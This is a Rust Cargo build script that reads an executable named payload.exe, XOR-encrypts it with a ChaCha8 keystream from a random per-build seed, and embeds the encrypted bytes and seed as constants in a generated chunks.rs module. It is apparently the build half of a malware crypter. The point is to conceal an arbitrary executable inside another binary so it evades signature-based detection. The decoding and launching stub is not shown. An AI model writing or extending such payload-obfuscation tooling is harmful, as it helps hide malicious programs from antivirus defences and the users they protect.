use rand::{Rng, SeedableRng};
use rand_chacha::ChaCha8Rng;
use std::fs::{self, File};
use std::io::Write;
use std::path::Path;

fn main() {
    println!("cargo:rerun-if-changed=payload.exe");

    let payload_path = "payload.exe";

    let out_dir = std::env::var("OUT_DIR").expect("OUT_DIR missing");
    let dest_path = Path::new(&out_dir).join("chunks.rs");

    if !Path::new(payload_path).exists() {
        eprintln!("Warning: payload.exe not found. Creating dummy chunks module.");
        create_dummy_chunks(&dest_path);
        return;
    }

    let payload_data = fs::read(payload_path).expect("Failed to read payload.exe");
    println!("Payload size: {} bytes", payload_data.len());

    generate_chunks(&dest_path, &payload_data);
}

fn create_dummy_chunks(dest_path: &Path) {
    // Generate random seed even for dummy
    let seed = generate_random_seed();

    let mut f = File::create(dest_path).expect("Failed to create chunks.rs");
    writeln!(f, "// Auto-generated dummy chunks (no payload.exe found)").unwrap();
    writeln!(f, "pub const SEED: u64 = 0x{:X};", seed).unwrap();
    writeln!(f, "pub const ORIGINAL_SIZE: usize = 0;").unwrap();
    writeln!(f, "pub const CHUNK_SIZE: usize = 4096;").unwrap();
    writeln!(f, "pub const DATA_POOL: &[u8] = &[];").unwrap();
}

fn generate_random_seed() -> u64 {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    use std::time::{SystemTime, UNIX_EPOCH};

    let duration = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("Time went backwards");

    let mut hasher = DefaultHasher::new();
    duration.as_nanos().hash(&mut hasher);
    std::process::id().hash(&mut hasher);
    hasher.finish()
}

fn generate_chunks(dest_path: &Path, payload: &[u8]) {
    const CHUNK_SIZE: usize = 4096;
    let seed = generate_random_seed();
    let mut rng = ChaCha8Rng::seed_from_u64(seed);

    let mut obfuscated_pool = Vec::new();
    let mut cursor = 0;

    while cursor < payload.len() {
        let chunk_end = (cursor + CHUNK_SIZE).min(payload.len());
        let chunk = &payload[cursor..chunk_end];

        // XOR obfuscation with RNG stream
        for &byte in chunk {
            let key_byte: u8 = rng.gen();
            obfuscated_pool.push(byte ^ key_byte);
        }

        cursor = chunk_end;
    }

    let mut f = File::create(dest_path).expect("Failed to create chunks.rs");

    writeln!(f, "// Auto-generated obfuscated payload chunks").unwrap();
    writeln!(f, "// Original size: {} bytes", payload.len()).unwrap();
    writeln!(f, "// Pool size: {} bytes", obfuscated_pool.len()).unwrap();
    writeln!(f).unwrap();
    writeln!(f, "pub const SEED: u64 = 0x{:X};", seed).unwrap();
    writeln!(f, "pub const ORIGINAL_SIZE: usize = {};", payload.len()).unwrap();
    writeln!(f, "pub const CHUNK_SIZE: usize = {};", CHUNK_SIZE).unwrap();
    writeln!(f).unwrap();
    writeln!(f, "#[allow(dead_code)]").unwrap();
    writeln!(f, "pub const DATA_POOL: &[u8] = &[").unwrap();

    for (i, chunk) in obfuscated_pool.chunks(16).enumerate() {
        write!(f, "    ").unwrap();
        for (j, &byte) in chunk.iter().enumerate() {
            write!(f, "0x{:02X}", byte).unwrap();
            if i * 16 + j < obfuscated_pool.len() - 1 {
                write!(f, ",").unwrap();
            }
        }
        writeln!(f).unwrap();
    }

    writeln!(f, "];").unwrap();

    println!(
        "Generated chunks.rs with {} bytes of obfuscated data",
        obfuscated_pool.len()
    );
}
